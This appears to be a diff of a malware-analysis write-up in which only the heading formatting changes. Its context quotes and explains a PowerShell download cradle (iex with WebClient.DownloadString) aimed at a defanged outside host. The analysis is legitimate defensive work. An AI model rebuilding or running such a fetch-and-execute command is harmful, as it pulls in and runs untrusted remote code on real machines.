@@ -115,7 +115,7 @@ iex (new-object net.webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz
 As a note, the link above has been defanged. This also applies for the links in the following analysis.
 
 
-*Step-by-step Breakdown:*
+**Step-by-step Breakdown:**
 
 1. iex
 
@@ -130,7 +130,7 @@ Creates a new instance of the .NET class System.Net.WebClient. This object allow
 Calls the DownloadString method of the WebClient object. This downloads the content at the specified URL (hxxp[://]files[.]bpakcaging[.]xyz/update) as a string. Whatever code is hosted at that URL is fetched as text.
 
 
-*Putting it together:*
+**Putting it together:**
 
 The command:
 
